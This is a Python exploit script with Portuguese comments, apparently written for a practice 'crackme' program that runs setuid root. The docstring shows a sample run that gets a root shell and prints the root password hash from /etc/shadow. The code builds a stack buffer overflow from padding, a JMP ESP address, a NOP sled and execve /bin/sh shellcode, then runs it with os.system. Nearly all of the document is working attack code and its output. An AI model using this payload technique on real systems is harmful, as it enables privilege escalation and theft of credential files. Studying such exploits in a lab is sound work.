'''
Exploit para CrackMe.c
----------------------
Este exploit gera um Buffer Overflow no programinha crackme,
possibilitando executar o shellcode que chama uma /bin/sh.
O programa crackme roda com suidbit ligado como root.
Conseguir uma shell por aqui nos da acesso de administrador
no sistema :)

OBS: Pode ser que exploit nao retorne uma shell logo na
primeira tentativa. Execute varias vezes seguidas, se for
o caso, ateh retornar o #

Exemplo:
user@virtual:~$ python exp_crackme.py
Vc digitou: AAAAAAAAAAAAAAAAAAAAf8490909090901ÀPh//shh/bin89ãPS89á°♂̀
# <= CAIU NA SHELL \0/
# id uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user) <= podemos rodar programas como root
# cat /etc/shadow | grep root <= Duvida? Entao vamos retornar o hash da senha do administrador :)
root:$6$WvW0OWK2r96ZigQTBHy6y15alFh23kQ9wkt/M3n6vhT7rI:17589:0:99999:7::: <= Uhuu :)
#

---
Ivan S. Vargas | contato@is5.com.br
11/2017
'''
import os

#shellcode /bin/sh com apenas 23 bytes!
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
shellcode += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
shellcode += "\x0b\xcd\x80"

JMP_ESP = "\x66\x84\x04\x08" #0x08048466

#o sistema quebra com 52 bytes
#o EIP eh escrito a partir do byte 20

PAYLOAD = "A" * 20 + JMP_ESP + "\x90" * (52 - 20 - 4 - len(shellcode)) + shellcode

CMD = "./crackme " + PAYLOAD

os.system(CMD)
